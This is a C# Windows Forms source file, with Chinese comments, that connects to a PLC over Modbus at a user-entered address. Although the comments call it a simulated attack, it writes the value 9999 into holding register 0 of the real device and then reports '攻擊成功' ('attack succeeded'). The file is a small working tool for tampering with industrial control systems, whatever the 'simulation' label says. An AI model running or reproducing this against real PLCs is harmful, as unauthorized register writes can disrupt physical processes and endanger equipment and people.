using System;
using System.Windows.Forms;
using EasyModbus;  // 引用 EasyModbus 套件

namespace PLCModbusApp
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        // 當按鈕被點擊時，連接PLC並進行模擬攻擊
        private void btnConnectAndAttack_Click(object sender, EventArgs e)
        {
            try
            {
                // 從TextBox中讀取IP地址和端口
                string plcIp = txtPlcIp.Text;
                int port = int.Parse(txtPort.Text);

                // 創建 Modbus 客戶端
                ModbusClient modbusClient = new ModbusClient(plcIp, port);
                modbusClient.Connect();  // 連接到 PLC

                lblResult.Text = "連接成功！";

                // 立即進行模擬攻擊
                modbusClient.WriteSingleRegister(0, 9999);  // 模擬寫入錯誤數據到 PLC
                lblResult.Text += "\n攻擊成功！";

                modbusClient.Disconnect();  // 斷開與 PLC 的連接
            }
            catch (Exception ex)
            {
                lblResult.Text = "錯誤: " + ex.Message;
            }
        }
    }
}
